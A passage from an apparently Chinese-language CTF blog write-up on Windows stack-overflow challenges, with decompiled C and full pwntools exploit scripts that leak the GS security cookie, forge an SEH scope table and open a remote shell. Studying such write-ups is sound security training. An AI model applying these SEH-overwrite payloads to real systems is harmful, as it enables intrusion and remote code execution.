class="line">shell_addr = main_addr+<span class="number">733</span></span><br><span class="line">ebp = stack_addr+<span class="number">0x9c</span></span><br><span class="line">Next_addr =  ebp<span class="number">-0x10</span></span><br><span class="line">sl(str(Next_addr))</span><br><span class="line">ru(<span class="string">"value is "</span>)</span><br><span class="line">Next_value = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"Next_value"</span>,Next_value)</span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line">pay_3 = <span class="string">"a"</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span><span class="number">-4</span>,<span class="string">"\x22"</span>)+p32(ebp^___security_cookie_value)+<span class="string">"b"</span>*<span class="number">8</span>+p32(Next_value)+p32(main_addr + <span class="number">944</span>)+p32((stack_addr+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">"n"</span>)</span><br><span class="line">sl(pay_3)</span><br><span class="line">ru(<span class="string">"Do you want to know more?\r\n"</span>)</span><br><span class="line">sl(<span class="string">'yes'</span>)</span><br><span class="line">ru(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ri()</span><br></pre></td></tr></table></figure></p>
<h3 id="2-第五空间决赛-“九果”"><a href="#2-第五空间决赛-“九果”" class="headerlink" title="2. 第五空间决赛-“九果”"></a>2. 第五空间决赛-“九果”</h3><p>这道题当时没写出来（当时没做过win pwn，哭了），现在回过头来看这道题，和上一道<code>babystack</code>真的是神相似</p>
<p><code>main</code>函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// ST38_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+20h] [ebp-C0h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+24h] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+44h] [ebp-9Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+C8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  v3 = (FILE *)_acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">  setvbuf(v3, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = (FILE *)_acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setvbuf(v4, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to the Fifth CyberSecutiry FinalBattle!.."</span>);</span><br><span class="line">  sub_401420(<span class="string">"stack address = 0x%x\n"</span>, &amp;v9);</span><br><span class="line">  sub_401420(<span class="string">"main address = 0x%x\n"</span>, main);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"OtherwhereWillBeTheAnswer"</span>);</span><br><span class="line">    sub_401000(&amp;v9, <span class="number">10</span>);</span><br><span class="line">    v7 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"yes"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      v7 = -(v7 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">strcmp</span>(&amp;v9, <span class="string">"tj"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 )</span><br><span class="line">        v6 = -(v6 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_401000(&amp;v9, <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Where do you want to know"</span>);</span><br><span class="line">      v5 = (_DWORD *)sub_401060();</span><br><span class="line">      sub_401420(<span class="string">"Address 0x%x value is 0x%x\n"</span>, v5, *v5);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"...................................................."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"AAAA, Something goes wrong Please check your script?"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>同样是存在栈溢出和异常处理，方法思路和上一个题目是一摸一样的</p>
<p>Exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">ip = <span class="string">'192.168.1.103'</span></span><br><span class="line">prot = <span class="string">'9999'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':'</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line">r = remote(ip,prot)</span><br><span class="line">ru(<span class="string">"stack address = "</span>)</span><br><span class="line">stack_addr = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line">ru(<span class="string">"main address = "</span>)</span><br><span class="line">main_addr = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"main_addr"</span>,main_addr)</span><br><span class="line">ru(<span class="string">"OtherwhereWillBeTheAnswer\r\n"</span>)</span><br><span class="line">sl(<span class="string">"yes"</span>)</span><br><span class="line">ru(<span class="string">"Where do you want to know"</span>)</span><br><span class="line">___security_cookie_addr = main_addr+<span class="number">0x2f54</span></span><br><span class="line"></span><br><span class="line">sl(str(___security_cookie_addr))</span><br><span class="line">ru(<span class="string">"value is "</span>)</span><br><span class="line">___security_cookie_value = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"___security_cookie_value"</span>,___security_cookie_value)</span><br><span class="line">ru(<span class="string">"OtherwhereWillBeTheAnswer\r\n"</span>)</span><br><span class="line">sl(<span class="string">"yes"</span>)</span><br><span class="line">ru(<span class="string">"Where do you want to know"</span>)</span><br><span class="line">shell_addr = main_addr+<span class="number">733</span></span><br><span class="line">ebp = stack_addr+<span class="number">0x9c</span></span><br><span class="line">Next_addr =  ebp<span class="number">-0x10</span></span><br><span class="line">sl(str(Next_addr))</span><br><span class="line">ru(<span class="string">"value is "</span>)</span><br><span class="line">Next_value = eval(rud(<span class="string">"\r\n"</span>))</span><br><span class="line">li(<span class="string">"Next_value"</span>,Next_value)</span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line">pay_3 = <span class="string">"a"</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span><span class="number">-4</span>,<span class="string">"\x22"</span>)+p32(ebp^___security_cookie_value)+<span class="string">"b"</span>*<span class="number">8</span>+p32(Next_value)+p32(main_addr + <span class="number">944</span>)+p32((stack_addr+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">"OtherwhereWillBeTheAnswer\r\n"</span>)</span><br><span class="line">sl(<span class="string">"n"</span>)</span><br><span class="line">sl(pay_3)</span><br><span class="line">ru(<span class="string">"OtherwhereWillBeTheAnswer\r\n"</span>)</span><br><span class="line">sl(<span class="string">'yes'</span>)</span><br><span class="line">ru(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ri()</span><br></pre></td></tr></table></figure></p>
<h3 id="3-2019SUCTF-babystack"><a href="#3-2019SUCTF-babystack" class="headerlink" title="3. 2019SUCTF-babystack"></a>3. 2019SUCTF-babystack</h3><p>这道题相当于是前两道题的进阶，换汤不换药，getshell手法是一样的</p>
<blockquote>
<p>原题目留的后门是<code>type flag.txt</code>，为了方便，我把后门换成<code>cmd</code>，可以直接打开shell</p>
</blockquote>
<p>main函数流程很简单<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">sub_401820</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  FILE *v1; <span class="comment">// eax</span></span><br><span class="line">  FILE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// dl</span></span><br><span class="line">  __int64 v5; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+20h] [ebp-20h]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+28h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>i64;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  v1 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v1, <span class="number">0</span>);</span><br><span class="line">  v2 = _acrt_iob_func(<span class="number">1</span>);</span><br><span class="line">  setbuf(v2, <span class="number">0</span>);</span><br><span class="line">  sub_401028(<span class="string">"  ____        _            _____ _             _    \n"</span>);</span><br><span class="line">  sub_401028(<span class="string">" |  _ \\      | |          / ____| |           | |   \n"</span>);</span><br><span class="line">  sub_401028(<span class="string">" | |_) | __ _| |__  _   _| (___ | |_ __ _  ___| | __\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">" |  _ &lt; / _` | '_ \\| | | |\\___ \\| __/ _` |/ __| |/ /\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">" | |_) | (_| | |_) | |_| |____) | || (_| | (__|   &lt; \n"</span>);</span><br><span class="line">  sub_401028(<span class="string">" |____/ \\__,_|_.__/ \\__, |_____/ \\__\\__,_|\\___|_|\\_\\\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"                     __/ |                          \n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"                    |___/                           \n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello,I will give you some gifts"</span>);</span><br><span class="line">  sub_401028(<span class="string">"stack address = 0x%X\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"main address = 0x%X\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"So,Can You Tell me what did you know?\n"</span>);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  sub_4010B9(<span class="string">"%s"</span>, &amp;v5, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;v5) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *(&amp;v5 + v3);</span><br><span class="line">      <span class="keyword">if</span> ( (v4 - <span class="number">48</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v4 - <span class="number">65</span>) &lt;= <span class="number">5u</span> )</span><br><span class="line">          v0 = v4 + <span class="number">16</span> * v0 - <span class="number">55</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v0 = v4 + <span class="number">16</span> * (v0 - <span class="number">3</span>);</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401028(<span class="string">"You can not find Me!\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401028(<span class="string">"Error!\n"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>同样程序泄露了一个栈上变量的地址（栈地址）和<code>main</code>函数的地址，但是如果单纯用IDA来f5查看伪C代码的话看不出来具体发生异常的代码在哪，所以还需要审查一下汇编代码，果然发现一处比较可疑的代码</p>
<p><img src="https://s2.ax1x.com/2019/10/09/uIpCOx.png" alt></p>
<p>这里可能会发生”除0异常“，向上寻找一下给<code>esi</code>赋值的地方</p>
<p><img src="https://s2.ax1x.com/2019/10/09/uIpkTO.png" alt></p>
<p>可以发现，先是<code>ebx</code>的值赋值给<code>esi</code>，继而执行了<code>sub     esi, eax</code>，我们知道<code>ebx</code>是我们输入的字符串转换成16进制数（比如说输入12345678，转换成ebx=0x12345678），如果我们输入的和<code>eax</code>相等的话，那么就可以发生”除0异常“</p>
<p>动态调式一下执行<code>sub     esi, eax</code>前，<code>eax</code>的值是多少</p>
<p><img src="https://s2.ax1x.com/2019/10/09/uIpEkD.png" alt><br>可以发现<code>eax</code>的值是<code>.text</code>段上的，经过测试后发现与泄露出来的main函数的地址偏移是一样的，所以我们可以通过程序提供的main函数的地址直接算出来可以发生异常的地址，经过计算得出： <code>触发异常地址=main_addr+2083</code></p>
<p>程序发生异常后来到<code>sub_04013A0</code>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">sub_4013A0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+18h] [ebp-DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-D8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+38h] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+48h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">4</span>]; <span class="comment">// [esp+C8h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+CCh] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+D0h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+D4h] [ebp-20h]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+DCh] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  *Str = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  sub_401028(<span class="string">"Oops,You find Me!\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"OK,I can tell you something\n"</span>);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401028(<span class="string">"Do you want to know more?\n"</span>);</span><br><span class="line">    sub_4010B9(<span class="string">"%s"</span>, &amp;Dst, <span class="number">8</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    v3 = <span class="built_in">strcmp</span>(&amp;Dst, <span class="string">"yes"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">      v3 = -(v3 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">strcmp</span>(&amp;Dst, <span class="string">"no"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">        v2 = -(v2 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v0 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">      fgets(&amp;Dst, <span class="number">256</span>, v0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_401028(<span class="string">"Where do you want to know?\n"</span>);</span><br><span class="line">      sub_4010B9(<span class="string">"%s"</span>, Str, <span class="number">16</span>);</span><br><span class="line">      v1 = *atoi(Str);</span><br><span class="line">      sub_401028(<span class="string">"Address 0x%X value is 0x%X\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  sub_401028(<span class="string">"Now,I will tell you 1 + 1 = 3!\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"Oh,no!\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"You don't believe 1 + 1 = 3???\n"</span>);</span><br><span class="line">  sub_401028(<span class="string">"You do calculation like cxk!!!\n"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是发生过异常后跳转过来的函数，在<code>x32dbg</code>中好像不能够进去（或者是我技术太菜了），这里用Ex师傅的工具来搭建一下环境，<a href="https://github.com/Ex-Origin/win_server" target="_blank" rel="noopener">传送门</a></p>
<p>成功之后通过<code>pwntools</code>连接，然后用<code>x32dbg</code>附加进程即可调试</p>
<p>接下来的操作和前两道题是一样的，这里不在详解。但是有一点是需要注意的</p>
<p>原来<code>payload</code>是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SEH_scope_table = p32(0x0FFFFFFE4)</span><br><span class="line">SEH_scope_table += p32(0)</span><br><span class="line">SEH_scope_table += p32(0xFFFFFF20)</span><br><span class="line">SEH_scope_table += p32(0)</span><br><span class="line">SEH_scope_table += p32(0xFFFFFFFE)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line">pay_3 = &quot;a&quot;*4+SEH_scope_table.ljust(0x80-4,&quot;\x22&quot;)+p32(ebp^___security_cookie_value)+&quot;b&quot;*8+p32(Next_value)+p32(main_addr + 944)+p32((stack_addr+4)^___security_cookie_value)+p32(0)</span><br></pre></td></tr></table></figure></p>
<p>直接套这个模板是不行的，经过调试后发现</p>
<ul>
<li><p><code>SEH_scope_table</code>是不一样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SEH_scope_table = p32(0xFFFFFFE4)</span><br><span class="line">SEH_scope_table += p32(0)</span><br><span class="line">SEH_scope_table += p32(0xFFFFFF0c)</span><br><span class="line">SEH_scope_table += p32(0)</span><br><span class="line">SEH_scope_table += p32(0xFFFFFFFE)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&amp;Dst+4</code>的位置上会覆盖成<code>0xfefefefe</code>，具体原因不清楚，我们要绕过这里，前面由4个”a“，变成8个”a“，即可绕过</p>
</li>
</ul>
<p>最终<code>payload</code>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">"a"</span>*<span class="number">8</span>+SEH_scope_table.ljust(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">"a"</span>)+p32(___security_cookie_value^(ebp))+<span class="string">"a"</span>*<span class="number">8</span>+p32(Next_value)+p32(main_addr + <span class="number">0x9f2</span>)+p32(((ebp<span class="number">-0xac</span>)+<span class="number">8</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>Exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">ip = <span class="string">'192.168.1.103'</span></span><br><span class="line">prot = <span class="string">'1001'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':'</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line">r = remote(ip,prot)</span><br><span class="line"><span 